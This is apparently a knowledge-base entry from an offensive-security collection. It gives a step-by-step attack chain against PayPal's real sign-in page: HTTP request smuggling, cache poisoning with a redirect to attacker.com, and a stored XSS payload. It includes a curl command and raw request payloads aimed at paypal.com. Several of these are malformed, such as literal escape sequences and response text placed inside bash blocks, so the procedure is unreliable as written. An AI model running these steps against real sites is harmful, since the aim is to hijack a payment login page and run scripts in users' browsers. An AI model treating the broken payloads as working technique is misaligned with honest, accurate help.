---
tags:
  - http-request-smuggling
  - cache-poisoning
  - stored-xss
  - web-vulnerability
type: attack_chain
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands:
  - '[[commands/curl-http-smuggling]]'
  - '[[commands/burp-request-manipulation]]'
platforms:
  - Web
complexity: medium
procedures:
  - '[[procedures/Exploit-HTTP-Request-Smuggling-on-Frontend-Caching-Servers]]'
  - '[[procedures/Poison-Cache-with-Malicious-Redirect]]'
  - '[[procedures/Inject-Stored-XSS-Payload-via-Cached-Response]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
description: >-
  Multi-stage web attack exploiting HTTP request smuggling to poison frontend
  caches and inject stored XSS payloads on PayPal's sign-in page
skill_level: intermediate
impact_level: high
id: 795f11b5-2a51-4348-aaaa-4c446632212d
created_at: '2025-12-11T06:10:28.706Z'
updated_at: '2025-12-11T06:10:28.706Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0001]]'
  - '[[TA0002]]'
mitre_techniques:
  - '[[T1190]]'
  - '[[T1059.007]]'
---
# HTTP Request Smuggling Leading to Cache Poisoning and Stored XSS on PayPal Sign-in Page

## Overview

This attack chain demonstrates how an attacker can exploit a configuration issue in PayPal's frontend caching servers using HTTP request smuggling techniques. The attack allows poisoning the cache with malicious redirects containing XSS payloads, which interfere with the integrity of pages like https://paypal.com/signin. The result is stored XSS that executes arbitrary scripts in users' browsers, potentially disrupting sign-in functionality. No back-end data is affected, and the attack focuses on frontend cache manipulation.

## Attack Flow Visualization

```mermaid
graph LR
    A[HTTP Request Smuggling] --> B[Cache Poisoning]
    B --> C[Stored XSS Injection]
    C --> D[Page Integrity Interference]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Burp-Suite]]

### Target Environment

- Web platform
- Frontend caching servers handling requests to https://paypal.com/signin
- Network access to the target URL

### Initial Access Requirements

- Ability to send HTTP requests to the target
- No credentials required for initial exploitation
- Prior knowledge of request smuggling techniques

## Detailed Attack Procedures

## Step 1: Exploit HTTP Request Smuggling - [[procedures/Exploit-HTTP-Request-Smuggling-on-Frontend-Caching-Servers]]

### Objective

Identify and exploit a request smuggling vulnerability in the frontend caching servers to manipulate request handling.

### Instructions

Use [[tools/Burp-Suite]] to intercept and modify HTTP requests. Craft a smuggling payload using [[commands/curl-http-smuggling]] to test for desynchronization:

```bash
curl -H "Transfer-Encoding: chunked" -d "0\r\n\r\nGET /signin HTTP/1.1\r\nHost: paypal.com" https://paypal.com/signin
```

Monitor the response for signs of smuggling success, such as unexpected redirects or response mismatches.

### Validation

Confirm smuggling by observing if subsequent requests are affected, e.g., altered response bodies.

## Step 2: Poison Cache with Malicious Redirect - [[procedures/Poison-Cache-with-Malicious-Redirect]]

### Objective

Leverage the smuggling to create a cached redirect that includes attacker-controlled content.

### Instructions

Using the smuggled request, inject a redirect via [[commands/burp-request-manipulation]] in Burp Suite:

```bash
POST /signin HTTP/1.1\r\nHost: paypal.com\r\nContent-Length: 0\r\n\r\nHTTP/1.1 302 Found\r\nLocation: https://attacker.com/malicious
```

Send this to force the cache to store the poisoned redirect.

### Validation

Access the page again and check if the cache serves the malicious redirect.

## Step 3: Inject Stored XSS Payload via Cached Response - [[procedures/Inject-Stored-XSS-Payload-via-Cached-Response]]

### Objective

Embed an XSS payload in the cached response to execute scripts on user access.

### Instructions

Modify the poisoned cache entry with an XSS payload using [[commands/burp-request-manipulation]]:

```bash
POST /signin HTTP/1.1\r\nHost: paypal.com\r\nContent-Length: 0\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<script>alert('XSS')</script>
```

Ensure the payload is cached and rendered on the sign-in page.

### Validation

Visit https://paypal.com/signin and confirm the script executes in the browser.

## Attack Chain Summary

### Key Achievements

1. Successful request smuggling to bypass normal request handling.
2. Cache poisoning enabling persistent malicious content.
3. Stored XSS impacting user sessions and page integrity.
